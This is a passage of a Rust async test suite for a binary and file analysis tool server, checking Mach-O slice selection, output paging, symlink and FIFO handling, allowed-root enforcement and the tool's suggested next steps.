        .filter_map(|s| s["tool"].as_str())
        .collect();
    assert_eq!(tools[0], "inspect_archive", "{value}");
    assert!(tools.contains(&"analyze_npm_package"), "{tools:?}");
    // The details it embeds are small.
    assert!(value["format_details"].to_string().len() < 2_500, "{value}");

    // A package directory points at its package tool.
    let package = TempDir::new().unwrap();
    std::fs::write(package.path().join("package.json"), b"{}").unwrap();
    let (table, _) = harness
        .ok("analyze_file", json!({"file_path": package.path()}))
        .await;
    assert_eq!(first_step(&table), "analyze_npm_package", "{table}");
}

#[tokio::test]
async fn the_arch_argument_is_explained_when_it_changes_nothing() {
    let harness = Harness::new().await;
    let binary = sample("c_advanced_binary");
    let (value, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": binary, "sections": ["symbols"], "arch": "x86_64"}),
        )
        .await;
    assert!(
        value["notes"]["arch"]
            .as_str()
            .unwrap()
            .contains("universal"),
        "{value}"
    );
    let (value, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": binary, "section": "symbols", "arch": "x86_64"}),
        )
        .await;
    assert!(value["total"].is_u64());

    // A fat Mach-O (macOS ships /bin/ls as one): each slice is its own cache entry.
    let ls = std::path::Path::new("/bin/ls");
    let fat = std::fs::read(ls).is_ok_and(|b| b.starts_with(&[0xCA, 0xFE, 0xBA, 0xBE]));
    if fat {
        let (info, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": "/bin/ls", "sections": ["binary_info"], "arch": "x86_64"}),
            )
            .await;
        assert_eq!(info["binary_info"]["analyzed_slice"], "x86_64", "{info}");
        let (other, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": "/bin/ls", "sections": ["binary_info"], "arch": "arm64e"}),
            )
            .await;
        assert_ne!(other["binary_info"]["analyzed_slice"], "x86_64", "{other}");
        // A slice the file does not have is an error that names the slices.
        let message = harness
            .err(
                "analyze_file",
                json!({"file_path": "/bin/ls", "sections": ["binary_info"], "arch": "sparc"}),
            )
            .await;
        assert!(
            message.contains("not a slice") && message.contains("x86_64"),
            "{message}"
        );
    }
}

fn is_fat(path: &str) -> bool {
    std::fs::read(path).is_ok_and(|b| b.starts_with(&[0xCA, 0xFE, 0xBA, 0xBE]))
}

/// `arch` reaches every section that reads code, not only binary_info and
/// symbols: on a universal Mach-O the control-flow section reads the named
/// slice (the x86_64 slice has no function symbols; the ARM64 one is refused
/// as not x86), and the disassembly lists the named slice's code.
#[tokio::test]
async fn arch_reaches_the_code_sections_of_a_universal_binary() {
    if !is_fat("/bin/ls") {
        return;
    }
    let harness = Harness::new().await;
    let flow = |arch: &str| {
        let harness = &harness;
        let arguments = json!({"file_path": "/bin/ls", "sections": ["control_flow"], "arch": arch});
        async move { harness.err("analyze_file", arguments).await }
    };
    let x86 = flow("x86_64").await;
    let arm = flow("arm64e").await;
    assert!(!x86.contains("ARM64"), "{x86}");
    assert!(arm.contains("ARM64"), "{arm}");
    // The reported name is accepted. System binaries vary across macOS
    // versions; this runner's /bin/ls need not contain ARM64 subtype 12.
    let (info, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": "/bin/ls", "sections": ["binary_info"], "arch": "arm64e"}),
        )
        .await;
    let printed_arch = info["binary_info"]["analyzed_slice"].as_str().unwrap();
    let printed = flow(printed_arch).await;
    assert!(printed.contains("ARM64"), "{printed}");

    let (x86, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": "/bin/ls", "sections": ["disassembly"], "arch": "x86_64"}),
        )
        .await;
    let (arm, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": "/bin/ls", "sections": ["disassembly"], "arch": "arm64e"}),
        )
        .await;
    assert_eq!(x86["disassembly"]["architecture"], "x86_64", "{x86}");
    assert_ne!(arm["disassembly"]["architecture"], "x86_64", "{arm}");
    // Two slices never share a cached section: the second call computed its own.
    assert_ne!(
        x86["disassembly"]["analysis"]["total_instructions"],
        arm["disassembly"]["analysis"]["total_instructions"],
        "{x86} {arm}"
    );
}

/// `arch` on a file that is not a native executable (text, a jar) is
/// ignored with a note, never an error.
#[tokio::test]
async fn arch_on_a_non_executable_file_is_ignored_with_a_note() {
    use std::io::Write;
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let text = dir.path().join("note.txt");
    std::fs::write(&text, "hello world, this is a plain note\n").unwrap();
    let jar = dir.path().join("app.jar");
    {
        let mut zip = zip::write::ZipWriter::new(std::fs::File::create(&jar).unwrap());
        let opts = zip::write::SimpleFileOptions::default();
        zip.start_file("META-INF/MANIFEST.MF", opts).unwrap();
        zip.write_all(b"Manifest-Version: 1.0\n").unwrap();
        zip.start_file("A.class", opts).unwrap();
        zip.write_all(&[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52, 0, 1])
            .unwrap();
        zip.finish().unwrap();
    }
    for file in [&text, &jar] {
        let (value, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": file, "sections": ["strings"], "arch": "arm64"}),
            )
            .await;
        assert!(
            value["notes"]["arch"]
                .as_str()
                .unwrap()
                .contains("was ignored"),
            "{file:?}: {value}"
        );
        let (value, _) = harness
            .ok(
                "query_analysis",
                json!({"file_path": file, "section": "strings", "arch": "x86_64"}),
            )
            .await;
        assert!(value["total"].is_u64(), "{file:?}: {value}");
    }
}

/// An `arch` the file does not have is a tool error on analyze_file,
/// query_analysis and disassemble; a thin binary names its one architecture.
#[tokio::test]
async fn an_arch_the_file_does_not_have_is_an_error_that_names_what_it_has() {
    let harness = Harness::new().await;
    let thin = sample("c_advanced_binary");
    for (tool, args) in [
        (
            "analyze_file",
            json!({"file_path": thin, "sections": ["symbols"], "arch": "ppc"}),
        ),
        (
            "query_analysis",
            json!({"file_path": thin, "section": "symbols", "arch": "bogus"}),
        ),
        ("disassemble", json!({"file_path": thin, "arch": "ppc"})),
    ] {
        let message = harness.err(tool, args).await;
        assert!(
            message.contains("single-architecture") && message.contains("x86_64"),
            "{tool}: {message}"
        );
    }
    // The architecture it does have is accepted, with its other spellings.
    for arch in ["x86_64", "X86-64", "amd64"] {
        let (value, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": thin, "sections": ["symbols"], "arch": arch}),
            )
            .await;
        assert!(value["symbols"].is_object(), "{arch}: {value}");
    }
    if is_fat("/bin/ls") {
        for (tool, args) in [
            (
                "analyze_file",
                json!({"file_path": "/bin/ls", "vulnerabilities": true, "arch": "ppc"}),
            ),
            (
                "query_analysis",
                json!({"file_path": "/bin/ls", "section": "symbols", "arch": "bogus"}),
            ),
            (
                "disassemble",
                json!({"file_path": "/bin/ls", "arch": "ppc"}),
            ),
        ] {
            let message = harness.err(tool, args).await;
            assert!(
                message.contains("x86_64") && message.to_lowercase().contains("arm64"),
                "{tool}: {message}"
            );
        }
    }
}

/// A FIFO in a directory is skipped, never opened, and the table says so.
#[cfg(unix)]
#[tokio::test]
async fn a_triage_table_skips_a_fifo_and_reports_it() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.txt"), b"a").unwrap();
    assert!(std::process::Command::new("mkfifo")
        .arg(dir.path().join("pipe"))
        .status()
        .unwrap()
        .success());
    let (table, _) = tokio::time::timeout(
        std::time::Duration::from_secs(20),
        harness.ok(
            "analyze_file",
            json!({"file_path": dir.path().to_string_lossy()}),
        ),
    )
    .await
    .expect("a FIFO in the directory must not block the table");
    assert_eq!(table["total"], 1, "{table}");
    assert_eq!(table["files"][0]["path"], "a.txt", "{table}");
    assert_eq!(table["skipped_count"], 1, "{table}");
    assert_eq!(table["skipped"][0]["path"], "pipe", "{table}");
    assert!(
        table["skipped"][0]["skipped"]
            .as_str()
            .unwrap()
            .contains("named pipe"),
        "{table}"
    );
}

/// The instructions do not promise a cache for read_hex, which reads the file.
#[tokio::test]
async fn the_instructions_do_not_say_read_hex_is_cached() {
    let harness = Harness::new().await;
    let instructions = harness
        .client
        .peer_info()
        .and_then(|info| info.instructions.clone())
        .unwrap_or_default();
    assert!(instructions.contains("query_analysis and disassemble calls"));
    assert!(!instructions.contains("disassemble and read_hex"));
}

#[tokio::test]
async fn without_a_cache_the_note_does_not_ask_for_a_bigger_one() {
    let harness = Harness::with_config(|c| c.cache_enabled = false).await;
    let (value, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": sample("c_advanced_binary"), "sections": ["hashes"]}),
        )
        .await;
    let note = value["cache_note"].as_str().unwrap_or_default();
    assert!(note.contains("--no-cache"), "{value}");
    assert!(!note.contains("FILE_SCANNER_SECTION_CACHE_MB"), "{value}");
}

#[cfg(unix)]
#[tokio::test]
async fn a_triage_walk_checks_each_entry_against_the_allowed_roots() {
    let root = TempDir::new().unwrap();
    let outside = TempDir::new().unwrap();
    std::fs::write(outside.path().join("secret.txt"), b"secret").unwrap();
    std::fs::write(root.path().join("ok.txt"), b"fine").unwrap();
    let allowed = root.path().canonicalize().unwrap();
    let harness = Harness::with_config(|c| c.allow_roots = vec![allowed.clone()]).await;

    let (clean, _) = harness
        .ok("analyze_file", json!({"file_path": allowed}))
        .await;
    assert_eq!(clean["total"], 1);

    std::os::unix::fs::symlink(outside.path().join("secret.txt"), root.path().join("link"))
        .unwrap();
    // A link is never followed or listed, so one that points outside the roots
    // is skipped and counted like any other: the table still comes back.
    let (table, _) = harness
        .ok("analyze_file", json!({"file_path": allowed}))
        .await;
    assert_eq!(table["total"], 1, "{table}");
    assert!(
        table["links_skipped"]
            .as_str()
            .is_some_and(|t| t.starts_with("1 symbolic link")),
        "{table}"
    );
    assert!(!table.to_string().contains("secret"), "{table}");
    // The path the caller names itself keeps the rule.
    let message = harness
        .err(
            "analyze_file",
            json!({"file_path": root.path().join("link")}),
        )
        .await;
    assert!(message.contains("outside"), "{message}");
}

/// The fields around a page (a long path, the cache fields, a note) count
/// against the byte budget before the rows are fitted, so `returned` and
/// `next_offset` describe exactly the rows sent on every page of a re-scanned
/// strings query and of a listing under a very long path.
#[tokio::test]
async fn pages_keep_every_row_when_the_fields_around_them_are_long() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let mut deep = dir.path().to_path_buf();
    for letter in ["d", "e", "f", "g"] {
        deep.push(letter.repeat(100));
    }
    std::fs::create_dir_all(&deep).unwrap();
    let path = deep.join("dense.bin");
    let mut content = Vec::new();
    for i in 0..60_000u32 {
        content.extend_from_slice(format!("s{i:06}\0").as_bytes());
    }
    for i in 0..150u32 {
        content.extend_from_slice(format!("an error happened here number {i:04}\0").as_bytes());
    }
    std::fs::write(&path, &content).unwrap();
    let file = path.to_string_lossy().to_string();

    for budget in [4_000usize, 8_000] {
        let (mut offset, mut seen, mut pages) = (0usize, 0usize, 0);
        loop {
            let (page, size) = harness
                .ok(
                    "query_analysis",
                    json!({"file_path": file, "section": "strings", "filter": "error",
                           "limit": 500, "offset": offset, "max_output_bytes": budget}),
                )
                .await;
            assert!(size <= budget, "{size} > {budget}");
            assert!(
                page.get("truncated").is_none(),
                "no row or value is cut: {page}"
            );
            let rows = page["items"].as_array().unwrap().len();
            assert_eq!(page["returned"], json!(rows), "{page}");
            seen += rows;
            pages += 1;
            match page.get("next_offset").and_then(Value::as_u64) {
                Some(next) => {
                    assert_eq!(next as usize, offset + rows, "{page}");
                    offset = next as usize;
                }
                None => break,
            }
            assert!(pages < 200);
        }
        assert_eq!(seen, 150, "every matching row came back at budget {budget}");
    }
}

/// A large function's instructions are not held in the stored section, and a
/// function or address beyond what is stored is decoded again on request.
#[tokio::test]
async fn disassemble_reaches_code_beyond_the_stored_part() {
    let harness = Harness::new().await;
    let file = sample("go_test_binary");
    let (table, _) = harness.ok("disassemble", json!({"file_path": file})).await;
    assert!(table["total"].as_u64().unwrap() > 1000, "{table}");
    // A function near the end of the program, by name.
    let (late, _) = harness
        .ok(
            "disassemble",
            json!({"file_path": file, "function": "net/http.(*socksDialer).pathAddrs",
                   "max_instructions": 5}),
        )
        .await;
    assert_eq!(late["returned"], 5, "{late}");
    assert!(late["function"]["instructions"].as_u64().unwrap() > 5);
    // The same by address, in the middle of that function.
    let (by_address, _) = harness
        .ok(
            "disassemble",
            json!({"file_path": file, "address": "0x600000", "max_instructions": 3}),
        )
        .await;
    assert_eq!(by_address["returned"], 3, "{by_address}");
    assert!(by_address["listing"].as_str().unwrap().contains("0x600007"));
    // A budget that cuts the listing keeps `returned` and `next_address` true.
    let (cut, size) = harness
        .ok(
            "disassemble",
            json!({"file_path": file, "address": "0x600000", "max_instructions": 100,
                   "max_output_bytes": 4_000}),
        )
        .await;
    assert!(size <= 4_000, "{size}");
    let lines = cut["listing"].as_str().unwrap().lines().count();
    assert_eq!(cut["returned"], json!(lines), "{cut}");
    assert!(cut["next_address"].is_string());
    // The table names the range of the whole code, not of the stored part.
    let range = table["decoded_range"].as_str().unwrap();
    assert!(range.ends_with("..0x67a150"), "{range}");
    // A query over the instruction list says it covers the stored part only.
    let (query, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "disassembly", "list": "instructions",
                   "filter": "syscall", "limit": 3}),
        )
        .await;
    assert!(
        query["instructions_in_file"].as_u64().unwrap() > 20_000,
        "{query}"
    );
    assert!(
        query["note"].as_str().unwrap().contains("stored"),
        "{query}"
    );
}

#[tokio::test]
async fn an_oversized_minimum_string_length_is_refused_with_the_limit() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let file = strings_file(&dir).to_string_lossy().to_string();
    for tool_args in [
        json!({"file_path": file, "min_string_length": 150_000}),
        json!({"file_path": file, "min_string_length": 150_000, "sections": ["strings"]}),
    ] {
        let message = harness.err("analyze_file", tool_args).await;
        assert!(message.contains("4096"), "{message}");
    }
    let message = harness
        .err(
            "query_analysis",
            json!({"file_path": file, "section": "strings", "min_string_length": 150_000}),
        )
        .await;
    assert!(message.contains("4096"), "{message}");
}

/// Next steps never lead to a tool that refuses the file.
#[tokio::test]
async fn next_steps_skip_tools_that_do_not_take_the_kind() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let rtf = dir.path().join("note.rtf");
    std::fs::write(&rtf, b"{\\rtf1\\ansi hello}").unwrap();
    let (overview, _) = harness
        .ok("analyze_file", json!({"file_path": rtf.to_string_lossy()}))
        .await;
    let tools: Vec<&str> = overview["next_steps"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|s| s["tool"].as_str())
        .collect();
    assert!(!tools.contains(&"analyze_document"), "{overview}");

    let setup = dir.path().join("setup.py");
    std::fs::write(&setup, b"from setuptools import setup\nsetup(name='x')\n").unwrap();
    let (overview, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": setup.to_string_lossy()}),
        )
        .await;
    let tools: Vec<&str> = overview["next_steps"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|s| s["tool"].as_str())
        .collect();
    assert!(tools.contains(&"analyze_python_package"), "{overview}");
}

#[cfg(unix)]
#[tokio::test]
async fn a_triage_table_counts_the_symbolic_links_it_left_out() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("a.txt"), b"a").unwrap();
    std::os::unix::fs::symlink(dir.path().join("a.txt"), dir.path().join("link")).unwrap();
    let (table, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": dir.path().to_string_lossy()}),
        )
        .await;
    assert_eq!(table["total"], 1, "{table}");
    assert!(
        table["links_skipped"]
            .as_str()
            .unwrap()
            .starts_with("1 symbolic link"),
        "{table}"
    );
}

#[tokio::test]
async fn unreachable_functions_are_named_and_compare_says_when_strings_were_cut() {
    let harness = Harness::new().await;
    let file = sample("c_advanced_binary");
    let (page, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "call_graph", "list": "unreachable_functions",
                   "limit": 5}),
        )
        .await;
    for item in page["items"].as_array().unwrap() {
        assert!(item.is_object(), "{page}");
        assert!(item["function_address"].is_u64(), "{page}");
        assert!(item["function_name"].is_string(), "{page}");
    }
    assert!(
        page["items"].as_array().is_some_and(|l| !l.is_empty()),
        "{page}"
    );

    // Two files with more categorized strings than the stored list keeps:
    // each side says that only the first part was compared.
    let dir = TempDir::new().unwrap();
    let mut paths = Vec::new();
    for (name, tag) in [("a.bin", "alpha"), ("b.bin", "beta")] {
        let mut bytes = Vec::new();
        for i in 0..55_000 {
            bytes.extend_from_slice(format!("http://{tag}{i}.example.com/p\0").as_bytes());
        }
        let path = dir.path().join(name);
        std::fs::write(&path, bytes).unwrap();
        paths.push(path.to_string_lossy().to_string());
    }
    let (result, _) = harness
        .ok(
            "compare_files",
            json!({"file_a": paths[0], "file_b": paths[1]}),
        )
        .await;
    let notes = result["notes"].to_string();
    assert!(
        notes.contains("file_a: strings: only the first")
            && notes.contains("file_b: strings: only the first"),
        "{result}"
    );
}

/// A fat Mach-O of empty thin slices, one per `(cpu type, cpu subtype)`.
fn fat_macho(slices: &[(u32, u32)]) -> Vec<u8> {
    let thin = |cpu: u32, sub: u32| -> Vec<u8> {
        let mut b = Vec::new();
        for v in [0xfeed_facf_u32, cpu, sub, 2, 0, 0, 0, 0] {
            b.extend_from_slice(&v.to_le_bytes());
        }
        b.extend_from_slice(&[0u8; 32]);
        b
    };
    let mut fat = Vec::new();
    fat.extend_from_slice(&0xcafe_babe_u32.to_be_bytes());
    fat.extend_from_slice(&(slices.len() as u32).to_be_bytes());
    let mut offset = 4096u32;
    let mut body = Vec::new();
    for &(cpu, sub) in slices {
        let data = thin(cpu, sub);
        for v in [cpu, sub, offset, data.len() as u32, 12] {
            fat.extend_from_slice(&v.to_be_bytes());
        }
        body.push((offset as usize, data));
        offset += 4096;
    }
    fat.resize(4096, 0);
    for (at, data) in body {
        fat.resize(at, 0);
        fat.extend_from_slice(&data);
    }
    fat
}

/// A fat Mach-O built here (two empty thin slices): `arch` picks the slice.
#[tokio::test]
async fn arch_picks_the_slice_of_a_fat_macho_built_in_the_test() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("fat.bin");
    std::fs::write(&path, fat_macho(&[(0x0100_0007, 3), (0x0100_000c, 0)])).unwrap();
    for (arch, expected) in [("x86_64", "x86_64"), ("arm64", "ARM64")] {
        let (info, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": path, "sections": ["binary_info"], "arch": arch}),
            )
            .await;
        assert_eq!(info["binary_info"]["analyzed_slice"], expected, "{info}");
    }
}

/// The overview prints the slices the way `arch` accepts them, `arm64` names the
/// one ARM64-family slice when there is exactly one, the third kind of slice
/// has a name without spaces or parentheses (the old spelling still works), and
/// an ambiguous or unknown name is an error that lists the names.
#[tokio::test]
async fn slice_names_in_the_overview_are_the_names_arch_accepts() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    // x86_64, ARM64E and "ARM64 (subtype 12)", independent of the host's /bin/ls.
    let three = dir.path().join("three.bin");
    std::fs::write(
        &three,
        fat_macho(&[(0x0100_0007, 3), (0x0100_000c, 2), (0x0100_000c, 12)]),
    )
    .unwrap();
    let (overview, _) = harness
        .ok("analyze_file", json!({"file_path": three}))
        .await;
    assert_eq!(
        overview["type"], "Mach-O universal binary (3 slices: x86_64, arm64e, arm64-subtype-12)",
        "{overview}"
    );
    let named = |arch: &'static str| {
        let (harness, three) = (&harness, &three);
        async move {
            harness
                .ok(
                    "analyze_file",
                    json!({"file_path": three, "sections": ["binary_info"], "arch": arch}),
                )
                .await
                .0["binary_info"]["analyzed_slice"]
                .clone()
        }
    };
    for arch in ["arm64-subtype-12", "ARM64 (subtype 12)", "arm64_subtype_12"] {
        assert_eq!(named(arch).await, "ARM64 (subtype 12)", "{arch}");
    }
    assert_eq!(named("arm64e").await, "ARM64E");
    // Two slices are ARM64 family here: `arm64` does not say which.
    let message = harness
        .err(
            "analyze_file",
            json!({"file_path": three, "sections": ["binary_info"], "arch": "arm64"}),
        )
        .await;
    assert!(
        message.contains("x86_64, arm64e, arm64-subtype-12"),
        "{message}"
    );
    // With one ARM64-family slice, `arm64` names it.
    let two = dir.path().join("two.bin");
    std::fs::write(&two, fat_macho(&[(0x0100_0007, 3), (0x0100_000c, 2)])).unwrap();
    for tool_args in [
        json!({"file_path": two, "sections": ["binary_info"], "arch": "arm64"}),
        json!({"file_path": two, "sections": ["binary_info"], "arch": "aarch64"}),
    ] {
        let (info, _) = harness.ok("analyze_file", tool_args).await;
        assert_eq!(info["binary_info"]["analyzed_slice"], "ARM64E", "{info}");
    }
    let (rows, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": two, "section": "binary_info", "arch": "arm64"}),
        )
        .await;
    assert_eq!(rows["section"], "binary_info", "{rows}");
}

/// The overview of a universal binary whose default slice is ARM64 says the
/// control-flow sections cannot run, why, and which `arch` reaches the x86
/// slice; every next step carries the `arch` the call named.
#[tokio::test]
async fn an_arm64_slice_does_not_offer_the_x86_only_sections_and_next_steps_keep_arch() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("fat.bin");
    std::fs::write(&path, fat_macho(&[(0x0100_0007, 3), (0x0100_000c, 2)])).unwrap();
    let (arm, _) = harness
        .ok("analyze_file", json!({"file_path": path, "arch": "arm64e"}))
        .await;
    let available: Vec<&str> = arm["available_sections"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(Value::as_str)
        .collect();
    for name in ["control_flow", "vulnerabilities", "code_quality"] {
        assert!(!available.contains(&name), "{name}: {available:?}");
        let why = arm["not_applicable"][name].as_str().unwrap_or_default();
        assert!(
            why.contains("x86") && why.contains("disassemble") && why.contains("arch: \"x86_64\""),
            "{name}: {why}"
        );
    }
    assert!(available.contains(&"disassembly"), "{available:?}");
    for step in arm["next_steps"].as_array().unwrap() {
        if step["tool"] != "read_hex" {
            assert_eq!(step["arguments"]["arch"], "arm64e", "{step}");
        }
    }
    let (x86, _) = harness
        .ok("analyze_file", json!({"file_path": path, "arch": "x86_64"}))
        .await;
    assert!(x86["available_sections"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s == "control_flow"));
    assert!(x86["not_applicable"].get("control_flow").is_none(), "{x86}");
}

/// Every step of the overview is callable as written, with the real values
/// already in `arguments`; so is the first step of the function list.
#[tokio::test]
async fn overview_next_steps_run_as_written() {
    let harness = Harness::new().await;
    let file = sample("c_advanced_binary");
    let (overview, _) = harness.ok("analyze_file", json!({"file_path": file})).await;
    let text = overview["next_steps"].to_string();
    assert!(!text.contains('<'), "no placeholder in the steps: {text}");
    for step in overview["next_steps"].as_array().unwrap() {
        let tool = step["tool"].as_str().unwrap();
        let (answer, _) = harness.ok(tool, step["arguments"].clone()).await;
        if tool == "disassemble" {
            // The function list: its own first step lists that function.
            let next = &answer["next_steps"][0];
            assert_eq!(next["tool"], "disassemble", "{answer}");
            assert!(!next.to_string().contains('<'), "{next}");
            let (listing, _) = harness.ok("disassemble", next["arguments"].clone()).await;
            assert_eq!(listing["view"], "listing", "{listing}");
        }
        if tool == "analyze_file" {
            assert!(
                answer["symbols"].is_object() || answer["threats"].is_object(),
                "{answer}"
            );
        }
    }
    // The imports step points at the list that holds the rows the count names.
    let imports = overview["counts"]["imported_symbols"].as_u64().unwrap();
    assert_eq!(
        imports,
        overview["format"]["imports_count"].as_u64().unwrap(),
        "{overview}"
    );
    let step = overview["next_steps"]
        .as_array()
        .unwrap()
        .iter()
        .find(|s| s["gives"] == "page the imported symbols")
        .expect("an imports step");
    let (rows, _) = harness
        .ok("query_analysis", step["arguments"].clone())
        .await;
    assert_eq!(rows["total"].as_u64().unwrap(), imports, "{rows}");
}

/// A Java class file and a gzip stream that is not a tar get no step that
/// cannot work for them.
#[tokio::test]
async fn the_overview_offers_only_what_runs_for_the_kind_of_file() {
    use std::io::Write as _;
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let class = dir.path().join("Loader.class");
    std::fs::write(&class, [0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 0x34, 0, 1]).unwrap();
    let (overview, _) = harness
        .ok("analyze_file", json!({"file_path": class}))
        .await;
    assert_eq!(overview["kind"], "java-class", "{overview}");
    let tools: Vec<&str> = overview["next_steps"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|s| s["tool"].as_str())
        .collect();
    assert_eq!(tools[0], "analyze_java_file", "{tools:?}");
    assert!(!tools.contains(&"disassemble"), "{tools:?}");
    assert!(
        !overview["next_steps"].to_string().contains("\"imports\""),
        "{overview}"
    );
    let available = overview["available_sections"].to_string();
    for native in ["disassembly", "control_flow", "call_graph", "symbols"] {
        assert!(!available.contains(native), "{native} in {available}");
        assert!(overview["not_applicable"][native].is_string(), "{native}");
    }

    let gz = dir.path().join("notes.txt.gz");
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    encoder
        .write_all(b"just some notes, not a tar archive\n")
        .unwrap();
    std::fs::write(&gz, encoder.finish().unwrap()).unwrap();
    let (overview, _) = harness.ok("analyze_file", json!({"file_path": gz})).await;
    let tools: Vec<&str> = overview["next_steps"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|s| s["tool"].as_str())
        .collect();
    assert!(!tools.contains(&"inspect_archive"), "{tools:?}");
}

/// `category` on a threats list matches the rule's `metadata.category`, the
/// field that names the category in those rows.
#[tokio::test]
async fn category_on_threats_matches_the_rows_metadata_category() {
    let harness = Harness::new().await;
    let file = sample("c_advanced_binary");
    let (all, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "threats"}),
        )
        .await;
    let rows = all["items"].as_array().unwrap();
    let wanted = rows
        .iter()
        .find_map(|r| r["metadata"]["category"].as_str())
        .expect("a threat match with a category")
        .to_string();
    let (hit, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "threats", "category": wanted}),
        )
        .await;
    let expected = rows
        .iter()
        .filter(|r| r["metadata"]["category"] == json!(wanted))
        .count();
    assert!(expected > 0);
    assert_eq!(hit["total"], json!(expected), "{hit}");
    let (miss, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "threats", "category": "no-such-category"}),
        )
        .await;
    assert!(
        miss["note"].as_str().unwrap().contains(&wanted),
        "the categories that exist are named: {miss}"
    );
}

/// A Go binary has more function symbols than the analyzer groups (5,000):
/// `main.main`, which comes after them, is reachable by name and by filter, the
/// list says it holds part of the symbols, and the cut lists of the other
/// sections say so on every page.
#[tokio::test]
async fn functions_beyond_the_grouped_table_are_reachable_and_cuts_are_named() {
    let harness = Harness::new().await;
    let file = sample("go_test_binary");
    let (listing, _) = harness
        .ok(
            "disassemble",
            json!({"file_path": file, "function": "main.main", "max_instructions": 20}),
        )
        .await;
    assert_eq!(listing["view"], "listing", "{listing}");
    assert_eq!(listing["function"]["name"], "main.main", "{listing}");
    assert!(listing["function"]["size"].as_u64().unwrap() > 0);
    assert!(
        listing["function"]["listed_from"]
            .as_str()
            .unwrap()
            .contains("symbol table"),
        "{listing}"
    );
    // The range is the function's own: all of it, and nothing after it.
    let (whole, _) = harness
        .ok(
            "disassemble",
            json!({"file_path": file, "function": "main.main", "max_instructions": 1000}),
        )
        .await;
    assert_eq!(
        whole["returned"], whole["function"]["instructions"],
        "{whole}"
    );
    assert!(whole.get("more").is_none(), "{whole}");
    assert!(listing["more"] == true && listing["remaining"].as_u64().unwrap() > 0);
    // Code decoded again for this call is not a cache hit.
    assert_eq!(whole["cache"], "partial", "{whole}");

    let (found, _) = harness
        .ok(
            "disassemble",
            json!({"file_path": file, "filter": "main.main"}),
        )
        .await;
    let row = &found["items"][0];
    assert_eq!(row["name"], "main.main", "{found}");
    assert!(row["listed_from"].is_string(), "{row}");
    let note = found["note"].as_str().unwrap();
    assert!(
        note.contains("5000 of the") && note.contains("symbols"),
        "{note}"
    );
    // The unfiltered list says the same, and its first step runs as written.
    let (table, _) = harness.ok("disassemble", json!({"file_path": file})).await;
    assert!(
        table["note"].as_str().unwrap().contains("5000 of the"),
        "{table}"
    );
    let step = &table["next_steps"][0]["arguments"];
    assert!(step["function"].is_string(), "{step}");
    harness.ok("disassemble", step.clone()).await;

    // Cut lists carry the analyzer's counts on every page.
    for (section, list, needle) in [
        ("call_graph", "edges", "25061"),
        ("call_graph", "functions", "7864"),
        ("code_quality", "functions", "5817"),
        ("disassembly", "functions", "817"),
    ] {
        let (page, _) = harness
            .ok(
                "query_analysis",
                json!({"file_path": file, "section": section, "list": list, "limit": 1,
                       "offset": 1}),
            )
            .await;
        let note = page["note"].as_str().unwrap_or_default();
        assert!(note.contains(needle), "{section} {list}: {page}");
    }

    // A string list that was cut keeps the true unfiltered count, and a
    // category with no match names the categories the file has.
    let (summary, _) = harness
        .ok(
            "analyze_file",
            json!({"file_path": file, "sections": ["strings"]}),
        )
        .await;
    let in_file = summary["strings"]["total_count"].as_u64().unwrap();
    for args in [
        json!({"file_path": file, "section": "strings", "category": "Email"}),
        json!({"file_path": file, "section": "strings", "filter": "msftupdater"}),
    ] {
        let (page, _) = harness.ok("query_analysis", args).await;
        assert_eq!(page["unfiltered_total"], json!(in_file), "{page}");
    }
    let (none, _) = harness
        .ok(
            "query_analysis",
            json!({"file_path": file, "section": "strings", "category": "Email"}),
        )
        .await;
    let note = none["note"].as_str().unwrap();
    assert!(note.contains("URL") && !note.contains("none"), "{note}");
}

/// A zip of `entries` (name, bytes) at `path`.
fn write_zip(path: &std::path::Path, entries: &[(&str, &[u8])]) {
    use std::io::Write as _;
    let mut zip = zip::write::ZipWriter::new(std::fs::File::create(path).unwrap());
    let opts = zip::write::SimpleFileOptions::default();
    for (name, data) in entries {
        zip.start_file(*name, opts).unwrap();
        zip.write_all(data).unwrap();
    }
    zip.finish().unwrap();
}

/// A .war or .ear gets the overview a .jar gets, and a plain zip (even one that
/// holds a WEB-INF directory) never gets the native pair or a disassemble step.
#[tokio::test]
async fn war_ear_and_zip_overviews_are_not_native() {
    let harness = Harness::new().await;
